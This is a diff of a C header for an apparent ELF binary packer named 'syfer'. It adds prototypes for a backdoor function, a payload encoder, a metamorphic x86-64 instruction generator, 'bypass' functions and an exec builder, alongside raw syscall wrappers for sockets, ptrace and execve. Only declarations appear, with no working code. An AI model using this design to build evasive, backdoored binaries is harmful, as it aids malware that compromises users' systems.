@@ -139,14 +139,16 @@ typedef struct		s_mh {
 }			t_mh;
 
 
-typedef struct		__attribute__((packed))__sy_binary
+typedef struct __attribute__((packed)) __sy_binary
 {
 	int					opts;
+	uint8_t					encrypt_rounds;
 	char					out_binary_name[PATH_MAX];
 	char					*binary_name;
 	struct stat				st;
 	char                    		**stub;
 	char					**ip;
+	char					*bypass_fcts[ 0x1000 ];
 }						t__sy_binary;
 
 typedef struct	__attribute__((packed))	__symbol
@@ -155,7 +157,7 @@ typedef struct	__attribute__((packed))	__symbol
 									// 1 Decrypt
 	uint16_t			id;
 	uint64_t			st_size;
-	uint8_t				_bac[ sizeof( uint64_t) ];
+	uint8_t				back[ sizeof( uint64_t) ];
 	uint8_t				key[ 8 ];
 }					t_sym;
 
@@ -167,20 +169,16 @@ typedef struct	__attribute__((packed))	__functions
 }					t_fct;
 
 typedef struct __attribute__((packed))	s_elf {
-	Elf64_Addr 			old_entrypoint;
-	Elf64_Off 			segment_offset;
-	Elf64_Addr 			segment_addr;
-	Elf64_Xword 			segment_size;
-	Elf64_Off 			section_offset;
-	Elf64_Addr 			section_addr;
-	Elf64_Xword 			section_size;
+	Elf64_Ehdr			hdr;
 	Elf64_Shdr			*text, *strtab, *symtab;
-	void 				*ptr;
+	Elf64_Phdr			**phdr_EXEC;
+	int				index;
+	char 				*ptr;
 	size_t 				filesize;
 	char const 			*filename;
 	t__sy_binary			*sy_binary;
 	uint8_t				*stub;
-	uint64_t			size_stub, n, tmp;	
+	uint64_t			size_stub;	
 } 					t_elf;
 
 typedef struct		__attribute__((packed))__sy_stub
@@ -234,7 +232,7 @@ size_t _strlen(const char *str);
 
 unsigned char *generate_key(const size_t size);
 
-void _xor(char *str, size_t const size, char const *key);
+void SY_xor(uint8_t *str_in, uint32_t length, uint8_t *key );
 void _rc4(const unsigned char *key, const size_t key_length, char *data, const size_t data_length);
 
 void	_date( void );
@@ -371,7 +369,7 @@ void    __delete_header( void * );
 
 // Encryption
 void 		__pg_AES_encrypt(char *key, char *value, size_t len );
-void		apply_inner_encryption( t_elf * );
+void		apply_inner_encryption( t_elf *, char ** );
 void		apply_global_encryption( t_elf * );
 void 		modify_stub_to_apply_internal_encryption( uint8_t *, size_t *,  Elf64_Phdr *, size_t * );
 
@@ -382,7 +380,7 @@ int	analyze_parameter( int, char **);
 int syfer( t__sy_binary * );
 
 
-// ** BACKDOOR ** //
+// **_t BACKDOOR ** //
 uint8_t		__SY_backdoor( char ** );
 
 
@@ -391,12 +389,37 @@ void *__SY_memmove ( void *, const void *, size_t );
 char __SY_isdigit( unsigned char );
 
 
+// ** ENCODER ** //
+uint8_t __sy_encoder( uint8_t *, uint8_t, uint16_t, char * );
+char *	__sy_generate_encoder( uint16_t );
+
+
 // ** UTILS.C ** //
-void	delete_symbols( void *, size_t );
+uint32_t	__sy_get_random_number( int );
 
 
 // ** METAMORPH.C ** //
-uint8_t	*__MH_mov_reg32_imm32( unsigned char, int, int * );
+uint8_t		*__mh_mov_regx32_imm32( uint8_t, int, int * );
+uint8_t		*__mh_sub_regx64_imm32( uint8_t, int, int * );
+uint8_t 	*__mh_push_regX64( register uint8_t, uint8_t * );
+uint8_t 	*__mh_push_imm32( register uint8_t, const int, uint8_t * );
+uint8_t 	*__mh_pop_regX64( register uint8_t, uint8_t * );
+uint8_t 	*__mh_mov_regX64_regX64( register uint8_t, register uint8_t, uint8_t * );
+
+typedef struct	s_str
+{
+	// ** Assembly code ** //
+	uint8_t	data[ ND_MAX_INSTRUCTION_LENGTH ];
+	// ** Assembly code size ** //
+	uint8_t size;
+	// ** register used ** //
+	uint8_t reg;
+}		t_str; 
+uint8_t		*__mh_movabs_str( register uint8_t, uint8_t *, char *);
+
+
+// ** EXEC ** //
+uint8_t		*__sy_make_exec( const char *, size_t, const char *cmd );
 
 // ** ASSEMBLY SYSCALL ** //
 # define SYS_READ       	0X00
@@ -404,36 +427,36 @@ uint8_t	*__MH_mov_reg32_imm32( unsigned char, int, int * );
 # define SYS_OPEN       	0X02
 # define SYS_CLOSE      	0X03
 # define SYS_STAT      		0X04
-# define SYS_FSTAT      	    0X05
-# define SYS_MMAP       	    0X09
-# define SYS_MPROTEC    	    0X0A
-# define SYS_MUNMAP     	    0X0B
-# define SYS_ACCESS     	    0X15
-# define SYS_NANOSLEEP		    0X23
-# define SYS_GETPID		        0X27
-# define SYS_GETPPID		    0X6E
-# define SYS_SOCKET		        0X29
-# define SYS_FORK		        0X39
-# define SYS_CONNECT		    0X2A
-# define SYS_SENDTO		        0X2C
-# define SYS_RECVFROM		    0X2D
-# define SYS_CHDIR		        0X50
-# define SYS_CHMOD		        0X5A
-# define SYS_EXIT		        0X3C
-# define SYS_UNLINK		        0X57
-# define SYS_KILL		        0X3E
+# define SYS_FSTAT      	0X05
+# define SYS_MMAP       	0X09
+# define SYS_MPROTEC    	0X0A
+# define SYS_MUNMAP     	0X0B
+# define SYS_ACCESS     	0X15
+# define SYS_NANOSLEEP		0X23
+# define SYS_GETPID		0X27
+# define SYS_GETPPID		0X6E
+# define SYS_SOCKET		0X29
+# define SYS_FORK		0X39
+# define SYS_CONNECT		0X2A
+# define SYS_SENDTO		0X2C
+# define SYS_RECVFROM		0X2D
+# define SYS_CHDIR		0X50
+# define SYS_CHMOD		0X5A
+# define SYS_EXIT		0X3C
+# define SYS_UNLINK		0X57
+# define SYS_KILL		0X3E
 # define SYS_GETTIMEOFDAY       0X60
-# define SYS_PTRACE     	    0X65
-# define SYS_GETDENTS64 	    0XD9
-# define SYS_UTIME 		        0X84
-# define SYS_TIMER_CREATE 	    0XDE
-# define SYS_TIMER_SETTIME 	    0XDF
-# define SYS_TIMER_DELETE 	    0XE2
-# define SYS_OPENAT     	    0X101
+# define SYS_PTRACE     	0X65
+# define SYS_GETDENTS64 	0XD9
+# define SYS_UTIME 		0X84
+# define SYS_TIMER_CREATE 	0XDE
+# define SYS_TIMER_SETTIME 	0XDF
+# define SYS_TIMER_DELETE 	0XE2
+# define SYS_OPENAT     	0X101
 # define SYS_INOTIFY_INIT       0XFD
 # define SYS_INOTIFY_ADD_WATCH	0XFE
 # define SYS_INOTIFY_RM_WATCH	0XFF
-# define SYS_EXECVE		        0X3B
+# define SYS_EXECVE		0X3B
 # define SYS_SETSOCKOPT         0X36
 
 # define INLINE __attribute__((always_inline)) inline
@@ -445,18 +468,18 @@ uint8_t	*__MH_mov_reg32_imm32( unsigned char, int, int * );
 						"  syscall\n"           \
 						"  leave\n"             \
 						"  ret\n");
-int	    sys_socket( int, int, int );
-int	    sys_connect( int, struct sockaddr *, socklen_t );
-int	    sys_sendto( int,void *, size_t, int, struct sockaddr *,socklen_t );
-int	    sys_recvfrom( int, void *, size_t, int, struct sockaddr *, socklen_t * );
-int     sys_setsockopt( int, int, int, char *, int );
-int	    sys_gettimeofday( struct timeval *, struct timezone * );
-int	    sys_nanosleep( struct timespec *, struct timespec * );
-int	    sys_close( int );
-void    *sys_mmap( void *, size_t, int, int, int, off_t );
-int	    sys_mprotect( void *, size_t, int );
-int	    sys_munmap( void *, size_t );
-ssize_t	sys_write( int, const void *, size_t );
-int	sys_rt_sigaction( int, const struct kernel_sigaction *, const struct kernel_sigaction * );
+int		sys_socket( int, int, int );
+int		sys_connect( int, struct sockaddr *, socklen_t );
+int		sys_sendto( int,void *, size_t, int, struct sockaddr *,socklen_t );
+int		sys_recvfrom( int, void *, size_t, int, struct sockaddr *, socklen_t * );
+int		sys_setsockopt( int, int, int, char *, int );
+int		sys_gettimeofday( struct timeval *, struct timezone * );
+int		sys_nanosleep( struct timespec *, struct timespec * );
+int		sys_close( int );
+void    	*sys_mmap( void *, size_t, int, int, int, off_t );
+int		sys_mprotect( void *, size_t, int );
+int		sys_munmap( void *, size_t );
+ssize_t		sys_write( int, const void *, size_t );
+int		sys_rt_sigaction( int, const struct kernel_sigaction *, const struct kernel_sigaction * );
 
 #endif /* MAIN_H */
